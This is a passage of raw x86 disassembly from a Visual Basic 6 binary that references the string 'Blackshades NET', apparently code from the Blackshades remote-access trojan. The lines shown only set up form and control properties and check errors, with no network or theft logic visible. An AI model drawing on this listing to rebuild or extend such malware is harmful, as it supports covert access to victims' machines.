0087A2F8: call 00410A0Ch ; msvbvm60.dll.__vbaI4Str
0087A2FD: push eax
0087A2FE: push 00457BE8h ; Blackshades NET
0087A303: push 00000002h
0087A305: mov eax, [ebp+08h]
0087A308: mov eax, [eax]
0087A30A: push [ebp+08h]
0087A30D: call [eax+000006FCh]
0087A313: mov var_00000134, eax
0087A319: cmp var_00000134, 00000000h
0087A320: jnl 87A342h
0087A322: push 000006FCh
0087A327: push 00441844h
0087A32C: push [ebp+08h]
0087A32F: push var_00000134
0087A335: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087A33A: mov var_0000019C, eax
0087A340: jmp 87A349h
0087A342: and var_0000019C, 00000000h
0087A349: mov eax, [ebp+08h]
0087A34C: mov eax, [eax]
0087A34E: push [ebp+08h]
0087A351: call [eax+000002FCh]
0087A357: push eax
0087A358: lea eax, var_0000014C
0087A35E: push eax
0087A35F: call 00410A84h ; Set (object)
0087A364: push 00000003h
0087A366: pop ecx
0087A367: call 004108B0h ; msvbvm60.dll.__vbaI2I4
0087A36C: push eax
0087A36D: mov eax, var_0000014C
0087A373: mov eax, [eax]
0087A375: push var_0000014C
0087A37B: call [eax+0000011Ch]
0087A381: fclex 
0087A383: mov var_00000134, eax
0087A389: cmp var_00000134, 00000000h
0087A390: jnl 87A3B5h
0087A392: push 0000011Ch
0087A397: push 00440EDCh
0087A39C: push var_0000014C
0087A3A2: push var_00000134
0087A3A8: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087A3AD: mov var_000001A0, eax
0087A3B3: jmp 87A3BCh
0087A3B5: and var_000001A0, 00000000h
0087A3BC: push FFFFFFFFh
0087A3BE: mov eax, var_0000014C
0087A3C4: mov eax, [eax]
0087A3C6: push var_0000014C
0087A3CC: call [eax+00000154h]
0087A3D2: fclex 
0087A3D4: mov var_00000134, eax
0087A3DA: cmp var_00000134, 00000000h
0087A3E1: jnl 87A406h
0087A3E3: push 00000154h
0087A3E8: push 00440EDCh
0087A3ED: push var_0000014C
0087A3F3: push var_00000134
0087A3F9: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087A3FE: mov var_000001A4, eax
0087A404: jmp 87A40Dh
0087A406: and var_000001A4, 00000000h
0087A40D: push FFFFFFFFh
0087A40F: mov eax, var_0000014C
0087A415: mov eax, [eax]
0087A417: push var_0000014C
0087A41D: call [eax+00000164h]
0087A423: fclex 
0087A425: mov var_00000134, eax
0087A42B: cmp var_00000134, 00000000h
0087A432: jnl 87A457h
0087A434: push 00000164h
0087A439: push 00440EDCh
0087A43E: push var_0000014C
0087A444: push var_00000134
0087A44A: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087A44F: mov var_000001A8, eax
0087A455: jmp 87A45Eh
0087A457: and var_000001A8, 00000000h
0087A45E: push 00000006h
0087A460: pop ecx
0087A461: call 004108B0h ; msvbvm60.dll.__vbaI2I4
0087A466: push eax
0087A467: mov eax, var_0000014C
0087A46D: mov eax, [eax]
0087A46F: push var_0000014C
0087A475: call [eax+0000014Ch]
0087A47B: fclex 
0087A47D: mov var_00000134, eax
0087A483: cmp var_00000134, 00000000h
0087A48A: jnl 87A4AFh
0087A48C: push 0000014Ch
0087A491: push 00440EDCh
0087A496: push var_0000014C
0087A49C: push var_00000134
0087A4A2: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087A4A7: mov var_000001AC, eax
0087A4AD: jmp 87A4B6h
0087A4AF: and var_000001AC, 00000000h
0087A4B6: push 00000002h
0087A4B8: pop ecx
0087A4B9: call 004108B0h ; msvbvm60.dll.__vbaI2I4
0087A4BE: push eax
0087A4BF: mov eax, var_0000014C
0087A4C5: mov eax, [eax]
0087A4C7: push var_0000014C
0087A4CD: call [eax+0000012Ch]
0087A4D3: fclex 
0087A4D5: mov var_00000134, eax
0087A4DB: cmp var_00000134, 00000000h
0087A4E2: jnl 87A507h
0087A4E4: push 0000012Ch
0087A4E9: push 00440EDCh
0087A4EE: push var_0000014C
0087A4F4: push var_00000134
0087A4FA: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087A4FF: mov var_000001B0, eax
0087A505: jmp 87A50Eh
0087A507: and var_000001B0, 00000000h
0087A50E: push 00FFFFFFh
0087A513: mov eax, var_0000014C
0087A519: mov eax, [eax]
0087A51B: push var_0000014C
0087A521: call [eax+54h]
0087A524: fclex 
0087A526: mov var_00000134, eax
0087A52C: cmp var_00000134, 00000000h
0087A533: jnl 87A555h
0087A535: push 00000054h
0087A537: push 00440EDCh
0087A53C: push var_0000014C
0087A542: push var_00000134
0087A548: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087A54D: mov var_000001B4, eax
0087A553: jmp 87A55Ch
0087A555: and var_000001B4, 00000000h
0087A55C: mov eax, [ebp+08h]
0087A55F: mov eax, [eax]
0087A561: push [ebp+08h]
0087A564: call [eax+00000738h]
0087A56A: lea eax, var_00000124
0087A570: push eax
0087A571: mov eax, var_0000014C
0087A577: mov eax, [eax]
0087A579: push var_0000014C
0087A57F: call [eax+78h]
0087A582: fclex 
0087A584: mov var_00000134, eax
0087A58A: cmp var_00000134, 00000000h
0087A591: jnl 87A5B3h
0087A593: push 00000078h
0087A595: push 00440EDCh
0087A59A: push var_0000014C
0087A5A0: push var_00000134
0087A5A6: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087A5AB: mov var_000001B8, eax
0087A5B1: jmp 87A5BAh
0087A5B3: and var_000001B8, 00000000h
0087A5BA: fld real4 ptr var_00000124
0087A5C0: call 00410814h ; msvbvm60.dll.__vbaFpI4
0087A5C5: mov ecx, [ebp+08h]
0087A5C8: mov [ecx+50h], eax
0087A5CB: lea eax, var_00000124
0087A5D1: push eax
0087A5D2: mov eax, var_0000014C
0087A5D8: mov eax, [eax]
0087A5DA: push var_0000014C
0087A5E0: call [eax+70h]
0087A5E3: fclex 
0087A5E5: mov var_00000134, eax
0087A5EB: cmp var_00000134, 00000000h
0087A5F2: jnl 87A614h
0087A5F4: push 00000070h
0087A5F6: push 00440EDCh
0087A5FB: push var_0000014C
0087A601: push var_00000134
0087A607: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087A60C: mov var_000001BC, eax
0087A612: jmp 87A61Bh
0087A614: and var_000001BC, 00000000h
0087A61B: fld real4 ptr var_00000124
0087A621: call 00410814h ; msvbvm60.dll.__vbaFpI4
0087A626: mov ecx, [ebp+08h]
0087A629: mov [ecx+4Ch], eax
0087A62C: lea eax, var_00000124
0087A632: push eax
0087A633: mov eax, var_0000014C
0087A639: mov eax, [eax]
0087A63B: push var_0000014C
0087A641: call [eax+00000088h]
0087A647: fclex 
0087A649: mov var_00000134, eax
0087A64F: cmp var_00000134, 00000000h
0087A656: jnl 87A67Bh
0087A658: push 00000088h
0087A65D: push 00440EDCh
0087A662: push var_0000014C
0087A668: push var_00000134
0087A66E: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087A673: mov var_000001C0, eax
0087A679: jmp 87A682h
0087A67B: and var_000001C0, 00000000h
0087A682: fld real4 ptr var_00000124
0087A688: call 00410814h ; msvbvm60.dll.__vbaFpI4
0087A68D: mov ecx, [ebp+08h]
0087A690: mov [ecx+58h], eax
0087A693: lea eax, var_00000124
0087A699: push eax
0087A69A: mov eax, var_0000014C
0087A6A0: mov eax, [eax]
0087A6A2: push var_0000014C
0087A6A8: call [eax+00000080h]
0087A6AE: fclex 
0087A6B0: mov var_00000134, eax
0087A6B6: cmp var_00000134, 00000000h
0087A6BD: jnl 87A6E2h
0087A6BF: push 00000080h
0087A6C4: push 00440EDCh
0087A6C9: push var_0000014C
0087A6CF: push var_00000134
0087A6D5: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087A6DA: mov var_000001C4, eax
0087A6E0: jmp 87A6E9h
0087A6E2: and var_000001C4, 00000000h
0087A6E9: fld real4 ptr var_00000124
0087A6EF: call 00410814h ; msvbvm60.dll.__vbaFpI4
0087A6F4: mov ecx, [ebp+08h]
0087A6F7: mov [ecx+54h], eax
0087A6FA: push 00000000h
0087A6FC: lea eax, var_0000014C
0087A702: push eax
0087A703: call 004108E0h ; msvbvm60.dll.__vbaObjSetAddref
0087A708: mov eax, [ebp+08h]
0087A70B: mov eax, [eax]
0087A70D: push [ebp+08h]
0087A710: call [eax+00000338h]
0087A716: push eax
0087A717: lea eax, var_00000150
0087A71D: push eax
0087A71E: call 00410A84h ; Set (object)
0087A723: push FFFFFFFFh
0087A725: mov eax, var_00000150
0087A72B: mov eax, [eax]
0087A72D: push var_00000150
0087A733: call [eax+00000154h]
0087A739: fclex 
0087A73B: mov var_00000134, eax
0087A741: cmp var_00000134, 00000000h
0087A748: jnl 87A76Dh
0087A74A: push 00000154h
0087A74F: push 00440EDCh
0087A754: push var_00000150
0087A75A: push var_00000134
0087A760: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087A765: mov var_000001C8, eax
0087A76B: jmp 87A774h
0087A76D: and var_000001C8, 00000000h
0087A774: push 00000003h
0087A776: pop ecx
0087A777: call 004108B0h ; msvbvm60.dll.__vbaI2I4
0087A77C: push eax
0087A77D: mov eax, var_00000150
0087A783: mov eax, [eax]
0087A785: push var_00000150
0087A78B: call [eax+0000011Ch]
0087A791: fclex 
0087A793: mov var_00000134, eax
0087A799: cmp var_00000134, 00000000h
0087A7A0: jnl 87A7C5h
0087A7A2: push 0000011Ch
0087A7A7: push 00440EDCh
0087A7AC: push var_00000150
0087A7B2: push var_00000134
0087A7B8: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087A7BD: mov var_000001CC, eax
0087A7C3: jmp 87A7CCh
0087A7C5: and var_000001CC, 00000000h
0087A7CC: push 00000000h
0087A7CE: mov eax, var_00000150
0087A7D4: mov eax, [eax]
0087A7D6: push var_00000150
0087A7DC: call [eax+0000009Ch]
0087A7E2: fclex 
0087A7E4: mov var_00000134, eax
0087A7EA: cmp var_00000134, 00000000h
0087A7F1: jnl 87A816h
0087A7F3: push 0000009Ch
0087A7F8: push 00440EDCh
0087A7FD: push var_00000150
0087A803: push var_00000134
0087A809: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087A80E: mov var_000001D0, eax
0087A814: jmp 87A81Dh
0087A816: and var_000001D0, 00000000h
0087A81D: mov eax, [ebp+08h]
0087A820: mov eax, [eax]
0087A822: push [ebp+08h]
0087A825: call [eax+000002FCh]
0087A82B: push eax
0087A82C: lea eax, var_34
0087A82F: push eax
0087A830: call 00410A84h ; Set (object)
0087A835: mov var_00000134, eax
0087A83B: lea eax, var_00000124
0087A841: push eax
0087A842: mov eax, var_00000134
0087A848: mov eax, [eax]
0087A84A: push var_00000134
0087A850: call [eax+00000080h]
0087A856: fclex 
0087A858: mov var_00000138, eax
0087A85E: cmp var_00000138, 00000000h
0087A865: jnl 87A88Ah
0087A867: push 00000080h
0087A86C: push 00440EDCh
0087A871: push var_00000134
0087A877: push var_00000138
0087A87D: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087A882: mov var_000001D4, eax
0087A888: jmp 87A891h
0087A88A: and var_000001D4, 00000000h
0087A891: fld real4 ptr var_00000124
0087A897: push ecx
0087A898: fstp real4 ptr [esp]
0087A89B: mov eax, var_00000150
0087A8A1: mov eax, [eax]
0087A8A3: push var_00000150
0087A8A9: call [eax+00000084h]
0087A8AF: fclex 
0087A8B1: mov var_0000013C, eax
0087A8B7: cmp var_0000013C, 00000000h
0087A8BE: jnl 87A8E3h
0087A8C0: push 00000084h
0087A8C5: push 00440EDCh
0087A8CA: push var_00000150
0087A8D0: push var_0000013C
0087A8D6: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087A8DB: mov var_000001D8, eax
0087A8E1: jmp 87A8EAh
0087A8E3: and var_000001D8, 00000000h
0087A8EA: lea ecx, var_34
0087A8ED: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0087A8F2: mov eax, [ebp+08h]
0087A8F5: mov eax, [eax]
0087A8F7: push [ebp+08h]
0087A8FA: call [eax+000002FCh]
0087A900: push eax
0087A901: lea eax, var_34
0087A904: push eax
0087A905: call 00410A84h ; Set (object)
0087A90A: mov var_00000134, eax
0087A910: lea eax, var_00000124
0087A916: push eax
0087A917: mov eax, var_00000134
0087A91D: mov eax, [eax]
0087A91F: push var_00000134
0087A925: call [eax+00000088h]
0087A92B: fclex 
0087A92D: mov var_00000138, eax
0087A933: cmp var_00000138, 00000000h
0087A93A: jnl 87A95Fh
0087A93C: push 00000088h
0087A941: push 00440EDCh
0087A946: push var_00000134
0087A94C: push var_00000138
0087A952: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087A957: mov var_000001DC, eax
0087A95D: jmp 87A966h
0087A95F: and var_000001DC, 00000000h
0087A966: fld real4 ptr var_00000124
0087A96C: push ecx
0087A96D: fstp real4 ptr [esp]
0087A970: mov eax, var_00000150
0087A976: mov eax, [eax]
0087A978: push var_00000150
0087A97E: call [eax+0000008Ch]
0087A984: fclex 
0087A986: mov var_0000013C, eax
0087A98C: cmp var_0000013C, 00000000h
0087A993: jnl 87A9B8h
0087A995: push 0000008Ch
0087A99A: push 00440EDCh
0087A99F: push var_00000150
0087A9A5: push var_0000013C
0087A9AB: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087A9B0: mov var_000001E0, eax
0087A9B6: jmp 87A9BFh
0087A9B8: and var_000001E0, 00000000h
0087A9BF: lea ecx, var_34
0087A9C2: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0087A9C7: mov eax, [ebp+08h]
0087A9CA: mov eax, [eax]
0087A9CC: push [ebp+08h]
0087A9CF: call [eax+000002FCh]
0087A9D5: push eax
0087A9D6: lea eax, var_34
0087A9D9: push eax
0087A9DA: call 00410A84h ; Set (object)
0087A9DF: mov var_00000134, eax
0087A9E5: lea eax, var_38
0087A9E8: push eax
0087A9E9: mov eax, var_00000134
0087A9EF: mov eax, [eax]
0087A9F1: push var_00000134
0087A9F7: call [eax+60h]
0087A9FA: fclex 
0087A9FC: mov var_00000138, eax
0087AA02: cmp var_00000138, 00000000h
0087AA09: jnl 87AA2Bh
0087AA0B: push 00000060h
0087AA0D: push 00440EDCh
0087AA12: push var_00000134
0087AA18: push var_00000138
0087AA1E: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087AA23: mov var_000001E4, eax
0087AA29: jmp 87AA32h
0087AA2B: and var_000001E4, 00000000h
0087AA32: mov var_00000114, 80020004h
0087AA3C: mov var_0000011C, 0000000Ah
0087AA46: mov var_00000104, 80020004h
0087AA50: mov var_0000010C, 0000000Ah
0087AA5A: mov var_000000F4, 80020004h
0087AA64: mov var_000000FC, 0000000Ah
0087AA6E: mov var_000000E4, 80020004h
0087AA78: mov var_000000EC, 0000000Ah
0087AA82: mov var_000000D4, 80020004h
0087AA8C: mov var_000000DC, 0000000Ah
0087AA96: mov var_000000C4, 80020004h
0087AAA0: mov var_000000CC, 0000000Ah
0087AAAA: mov var_000000B4, 80020004h
0087AAB4: mov var_000000BC, 0000000Ah
0087AABE: mov eax, var_38
0087AAC1: mov var_00000168, eax
0087AAC7: and var_38, 00000000h
0087AACB: push 00000010h
0087AACD: pop eax
0087AACE: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0087AAD3: lea esi, var_0000011C
0087AAD9: mov edi, esp
0087AADB: movsd 
0087AADC: movsd 
0087AADD: movsd 
0087AADE: movsd 
0087AADF: push 00000010h
0087AAE1: pop eax
0087AAE2: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0087AAE7: lea esi, var_0000010C
0087AAED: mov edi, esp
0087AAEF: movsd 
0087AAF0: movsd 
0087AAF1: movsd 
0087AAF2: movsd 
0087AAF3: push 00000010h
0087AAF5: pop eax
0087AAF6: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0087AAFB: lea esi, var_000000FC
0087AB01: mov edi, esp
0087AB03: movsd 
0087AB04: movsd 
0087AB05: movsd 
0087AB06: movsd 
0087AB07: push 00000010h
0087AB09: pop eax
0087AB0A: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0087AB0F: lea esi, var_000000EC
0087AB15: mov edi, esp
0087AB17: movsd 
0087AB18: movsd 
0087AB19: movsd 
0087AB1A: movsd 
0087AB1B: push 00000010h
0087AB1D: pop eax
0087AB1E: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0087AB23: lea esi, var_000000DC
0087AB29: mov edi, esp
0087AB2B: movsd 
0087AB2C: movsd 
0087AB2D: movsd 
0087AB2E: movsd 
0087AB2F: push 00000010h
0087AB31: pop eax
0087AB32: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0087AB37: lea esi, var_000000CC
0087AB3D: mov edi, esp
0087AB3F: movsd 
0087AB40: movsd 
0087AB41: movsd 
0087AB42: movsd 
0087AB43: push 00000010h
0087AB45: pop eax
0087AB46: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0087AB4B: lea esi, var_000000BC
0087AB51: mov edi, esp
0087AB53: movsd 
0087AB54: movsd 
0087AB55: movsd 
0087AB56: movsd 
0087AB57: fldz 
0087AB59: push ecx
0087AB5A: fstp real4 ptr [esp]
0087AB5D: fldz 
0087AB5F: push ecx
0087AB60: fstp real4 ptr [esp]
0087AB63: push var_00000168
0087AB69: lea eax, var_3C
0087AB6C: push eax
0087AB6D: call 00410A84h ; Set (object)
0087AB72: push eax
0087AB73: mov eax, var_00000150
0087AB79: mov eax, [eax]
0087AB7B: push var_00000150
0087AB81: call [eax+00000280h]
0087AB87: fclex 
0087AB89: mov var_0000013C, eax
0087AB8F: cmp var_0000013C, 00000000h
0087AB96: jnl 87ABBBh
0087AB98: push 00000280h
0087AB9D: push 00440EDCh
0087ABA2: push var_00000150
0087ABA8: push var_0000013C
0087ABAE: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087ABB3: mov var_000001E8, eax
0087ABB9: jmp 87ABC2h
0087ABBB: and var_000001E8, 00000000h
0087ABC2: lea eax, var_3C
0087ABC5: push eax
0087ABC6: lea eax, var_34
0087ABC9: push eax
0087ABCA: push 00000002h
0087ABCC: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0087ABD1: add esp, 0000000Ch
0087ABD4: lea eax, var_34
0087ABD7: push eax
0087ABD8: mov eax, var_00000150
0087ABDE: mov eax, [eax]
0087ABE0: push var_00000150
0087ABE6: call [eax+00000188h]
0087ABEC: fclex 
0087ABEE: mov var_00000134, eax
0087ABF4: cmp var_00000134, 00000000h
0087ABFB: jnl 87AC20h
0087ABFD: push 00000188h
0087AC02: push 00440EDCh
0087AC07: push var_00000150
0087AC0D: push var_00000134
0087AC13: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087AC18: mov var_000001EC, eax
0087AC1E: jmp 87AC27h
0087AC20: and var_000001EC, 00000000h
0087AC27: mov eax, var_34
0087AC2A: mov var_0000016C, eax
0087AC30: and var_34, 00000000h
0087AC34: push var_0000016C
0087AC3A: lea eax, var_38
0087AC3D: push eax
0087AC3E: call 00410A84h ; Set (object)
0087AC43: push eax
0087AC44: mov eax, var_00000150
0087AC4A: mov eax, [eax]
0087AC4C: push var_00000150
0087AC52: call [eax+64h]
0087AC55: fclex 
0087AC57: mov var_00000138, eax
0087AC5D: cmp var_00000138, 00000000h
0087AC64: jnl 87AC86h
0087AC66: push 00000064h
0087AC68: push 00440EDCh
0087AC6D: push var_00000150
0087AC73: push var_00000138
0087AC79: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087AC7E: mov var_000001F0, eax
0087AC84: jmp 87AC8Dh
0087AC86: and var_000001F0, 00000000h
0087AC8D: lea ecx, var_38
0087AC90: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0087AC95: push 00000000h
0087AC97: lea eax, var_00000150
0087AC9D: push eax
0087AC9E: call 004108E0h ; msvbvm60.dll.__vbaObjSetAddref
0087ACA3: mov eax, [ebp+08h]
0087ACA6: mov eax, [eax]
0087ACA8: push [ebp+08h]
0087ACAB: call [eax+0000032Ch]
0087ACB1: push eax
0087ACB2: lea eax, var_34
0087ACB5: push eax
0087ACB6: call 00410A84h ; Set (object)
0087ACBB: mov var_00000134, eax
0087ACC1: push FFFFFFFFh
0087ACC3: mov eax, var_00000134
0087ACC9: mov eax, [eax]
0087ACCB: push var_00000134
0087ACD1: call [eax+00000084h]
0087ACD7: fclex 
0087ACD9: mov var_00000138, eax
0087ACDF: cmp var_00000138, 00000000h
0087ACE6: jnl 87AD0Bh
0087ACE8: push 00000084h
0087ACED: push 00457C24h
0087ACF2: push var_00000134
0087ACF8: push var_00000138
0087ACFE: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087AD03: mov var_000001F4, eax
0087AD09: jmp 87AD12h
0087AD0B: and var_000001F4, 00000000h
0087AD12: lea ecx, var_34
0087AD15: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0087AD1A: mov eax, [ebp+08h]
0087AD1D: mov eax, [eax]
0087AD1F: push [ebp+08h]
0087AD22: call [eax+00000330h]
0087AD28: push eax
0087AD29: lea eax, var_34
0087AD2C: push eax
0087AD2D: call 00410A84h ; Set (object)
0087AD32: mov var_00000134, eax
0087AD38: push FFFFFFFFh
0087AD3A: mov eax, var_00000134
0087AD40: mov eax, [eax]
0087AD42: push var_00000134
0087AD48: call [eax+00000084h]
0087AD4E: fclex 
0087AD50: mov var_00000138, eax
0087AD56: cmp var_00000138, 00000000h
0087AD5D: jnl 87AD82h
0087AD5F: push 00000084h
0087AD64: push 00457C34h
0087AD69: push var_00000134
0087AD6F: push var_00000138
0087AD75: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087AD7A: mov var_000001F8, eax
0087AD80: jmp 87AD89h
0087AD82: and var_000001F8, 00000000h
0087AD89: lea ecx, var_34
0087AD8C: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0087AD91: mov eax, [ebp+08h]
0087AD94: mov eax, [eax]
0087AD96: push [ebp+08h]
0087AD99: call [eax+0000033Ch]
0087AD9F: push eax
0087ADA0: lea eax, var_00000154
0087ADA6: push eax
0087ADA7: call 00410A84h ; Set (object)
0087ADAC: push FFFFFFFFh
0087ADAE: mov eax, var_00000154
0087ADB4: mov eax, [eax]
0087ADB6: push var_00000154
0087ADBC: call [eax+00000154h]
0087ADC2: fclex 
0087ADC4: mov var_00000134, eax
0087ADCA: cmp var_00000134, 00000000h
0087ADD1: jnl 87ADF6h
0087ADD3: push 00000154h
0087ADD8: push 00440EDCh
0087ADDD: push var_00000154
0087ADE3: push var_00000134
0087ADE9: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087ADEE: mov var_000001FC, eax
0087ADF4: jmp 87ADFDh
0087ADF6: and var_000001FC, 00000000h
0087ADFD: push 00000003h
0087ADFF: pop ecx
0087AE00: call 004108B0h ; msvbvm60.dll.__vbaI2I4
0087AE05: push eax
0087AE06: mov eax, var_00000154
0087AE0C: mov eax, [eax]
0087AE0E: push var_00000154
0087AE14: call [eax+0000011Ch]
0087AE1A: fclex 
0087AE1C: mov var_00000134, eax
0087AE22: cmp var_00000134, 00000000h
0087AE29: jnl 87AE4Eh
0087AE2B: push 0000011Ch
0087AE30: push 00440EDCh
0087AE35: push var_00000154
0087AE3B: push var_00000134
0087AE41: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087AE46: mov var_00000200, eax
0087AE4C: jmp 87AE55h
0087AE4E: and var_00000200, 00000000h
0087AE55: push 00000000h
0087AE57: mov eax, var_00000154
0087AE5D: mov eax, [eax]
0087AE5F: push var_00000154
0087AE65: call [eax+0000009Ch]
0087AE6B: fclex 
0087AE6D: mov var_00000134, eax
0087AE73: cmp var_00000134, 00000000h
0087AE7A: jnl 87AE9Fh
0087AE7C: push 0000009Ch
0087AE81: push 00440EDCh
0087AE86: push var_00000154
0087AE8C: push var_00000134
0087AE92: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087AE97: mov var_00000204, eax
0087AE9D: jmp 87AEA6h
0087AE9F: and var_00000204, 00000000h
0087AEA6: mov eax, [ebp+08h]
0087AEA9: mov eax, [eax]
0087AEAB: push [ebp+08h]
0087AEAE: call [eax+000002FCh]
0087AEB4: push eax
0087AEB5: lea eax, var_34
0087AEB8: push eax
0087AEB9: call 00410A84h ; Set (object)
0087AEBE: mov var_00000134, eax
0087AEC4: lea eax, var_00000124
0087AECA: push eax
0087AECB: mov eax, var_00000134
0087AED1: mov eax, [eax]
0087AED3: push var_00000134
0087AED9: call [eax+00000080h]
0087AEDF: fclex 
0087AEE1: mov var_00000138, eax
0087AEE7: cmp var_00000138, 00000000h
0087AEEE: jnl 87AF13h
0087AEF0: push 00000080h
0087AEF5: push 00440EDCh
0087AEFA: push var_00000134
0087AF00: push var_00000138
0087AF06: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087AF0B: mov var_00000208, eax
0087AF11: jmp 87AF1Ah
0087AF13: and var_00000208, 00000000h
0087AF1A: fld real4 ptr var_00000124
0087AF20: push ecx
0087AF21: fstp real4 ptr [esp]
0087AF24: mov eax, var_00000154
0087AF2A: mov eax, [eax]
0087AF2C: push var_00000154
0087AF32: call [eax+00000084h]
0087AF38: fclex 
0087AF3A: mov var_0000013C, eax
0087AF40: cmp var_0000013C, 00000000h
0087AF47: jnl 87AF6Ch
0087AF49: push 00000084h
0087AF4E: push 00440EDCh
0087AF53: push var_00000154
0087AF59: push var_0000013C
0087AF5F: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087AF64: mov var_0000020C, eax
0087AF6A: jmp 87AF73h
0087AF6C: and var_0000020C, 00000000h
0087AF73: lea ecx, var_34
0087AF76: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0087AF7B: mov eax, [ebp+08h]
0087AF7E: mov eax, [eax]
0087AF80: push [ebp+08h]
0087AF83: call [eax+000002FCh]
0087AF89: push eax
0087AF8A: lea eax, var_34
0087AF8D: push eax
0087AF8E: call 00410A84h ; Set (object)
0087AF93: mov var_00000134, eax
0087AF99: lea eax, var_00000124
0087AF9F: push eax
0087AFA0: mov eax, var_00000134
0087AFA6: mov eax, [eax]
0087AFA8: push var_00000134
0087AFAE: call [eax+00000088h]
0087AFB4: fclex 
0087AFB6: mov var_00000138, eax
0087AFBC: cmp var_00000138, 00000000h
0087AFC3: jnl 87AFE8h
0087AFC5: push 00000088h
0087AFCA: push 00440EDCh
0087AFCF: push var_00000134
0087AFD5: push var_00000138
0087AFDB: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087AFE0: mov var_00000210, eax
0087AFE6: jmp 87AFEFh
0087AFE8: and var_00000210, 00000000h
0087AFEF: fld real4 ptr var_00000124
0087AFF5: push ecx
0087AFF6: fstp real4 ptr [esp]
0087AFF9: mov eax, var_00000154
0087AFFF: mov eax, [eax]
0087B001: push var_00000154
0087B007: call [eax+0000008Ch]
0087B00D: fclex 
0087B00F: mov var_0000013C, eax
0087B015: cmp var_0000013C, 00000000h
0087B01C: jnl 87B041h
0087B01E: push 0000008Ch
0087B023: push 00440EDCh
0087B028: push var_00000154
0087B02E: push var_0000013C
0087B034: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087B039: mov var_00000214, eax
0087B03F: jmp 87B048h
0087B041: and var_00000214, 00000000h
0087B048: lea ecx, var_34
0087B04B: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0087B050: push 00000000h
0087B052: lea eax, var_00000154
0087B058: push eax
0087B059: call 004108E0h ; msvbvm60.dll.__vbaObjSetAddref
0087B05E: mov eax, [ebp+08h]
0087B061: mov eax, [eax]
0087B063: push [ebp+08h]
0087B066: call [eax+00000328h]
0087B06C: push eax
0087B06D: lea eax, var_38
0087B070: push eax
0087B071: call 00410A84h ; Set (object)
0087B076: mov var_00000134, eax
0087B07C: lea eax, var_00000128
0087B082: push eax
0087B083: mov eax, var_00000134
0087B089: mov eax, [eax]
0087B08B: push var_00000134
0087B091: call [eax+00000080h]
0087B097: fclex 
0087B099: mov var_00000138, eax
0087B09F: cmp var_00000138, 00000000h
0087B0A6: jnl 87B0CBh
0087B0A8: push 00000080h
0087B0AD: push 00440EDCh
0087B0B2: push var_00000134
0087B0B8: push var_00000138
0087B0BE: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087B0C3: mov var_00000218, eax
0087B0C9: jmp 87B0D2h
0087B0CB: and var_00000218, 00000000h
0087B0D2: mov eax, [ebp+08h]
0087B0D5: mov eax, [eax]
0087B0D7: push [ebp+08h]
0087B0DA: call [eax+00000330h]
0087B0E0: push eax
0087B0E1: lea eax, var_3C
0087B0E4: push eax
0087B0E5: call 00410A84h ; Set (object)
0087B0EA: mov var_00000144, eax
0087B0F0: mov eax, [ebp+08h]
0087B0F3: mov eax, [eax]
0087B0F5: push [ebp+08h]
0087B0F8: call [eax+00000328h]
0087B0FE: push eax
0087B0FF: lea eax, var_34
0087B102: push eax
0087B103: call 00410A84h ; Set (object)
0087B108: mov var_0000013C, eax
0087B10E: lea eax, var_00000124
0087B114: push eax
0087B115: mov eax, var_0000013C
0087B11B: mov eax, [eax]
0087B11D: push var_0000013C
0087B123: call [eax+70h]
0087B126: fclex 
0087B128: mov var_00000140, eax
0087B12E: cmp var_00000140, 00000000h
0087B135: jnl 87B157h
0087B137: push 00000070h
0087B139: push 00440EDCh
0087B13E: push var_0000013C
0087B144: push var_00000140
0087B14A: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087B14F: mov var_0000021C, eax
